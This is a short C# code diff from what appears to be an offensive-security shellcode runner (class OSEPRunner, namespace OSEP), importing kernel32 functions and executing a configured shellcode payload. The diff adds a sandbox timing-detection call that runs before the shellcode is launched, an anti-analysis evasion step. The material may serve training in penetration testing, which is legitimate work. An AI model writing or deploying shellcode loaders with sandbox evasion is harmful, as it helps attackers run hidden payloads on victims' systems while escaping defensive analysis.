@@ -8,7 +8,7 @@ using System.Threading.Tasks;
 
 
 namespace OSEP
-{
+{ 
 
     [ComVisible(true)]
     public class OSEPRunner
@@ -24,8 +24,14 @@ namespace OSEP
         [DllImport("kernel32.dll")]
         static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
 
+
+        
         public static void OSEPExec()
         {
+            if (CONFIG.DETECT_SANDBOX_TIME)
+                Evasion.SandboxTimeDetect();
+            
+
             int size = CONFIG.SHELLCODE.Length;
 
 
